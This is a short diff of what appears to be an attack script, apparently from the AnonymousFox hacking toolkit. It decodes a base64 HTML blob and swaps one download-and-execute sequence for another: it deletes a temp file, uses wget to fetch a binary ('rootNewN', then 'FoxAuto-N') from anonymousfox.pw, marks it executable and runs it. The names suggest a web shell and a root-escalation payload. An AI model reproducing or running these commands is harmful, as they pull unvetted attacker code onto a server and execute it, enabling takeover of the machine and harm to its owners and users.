@@ -122,7 +122,7 @@ Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48aW1nIHNy
 Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
 CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d
 
-rm -rf /tmp/AnonymousFox.bak
-wget http://anonymousfox.pw/local/wso/rootNewN
-chmod +x rootNewN
-./rootNewN 0
+rm -rf /tmp/FoxAuto
+wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-N
+chmod +x FoxAuto-N
+./FoxAuto-N 0
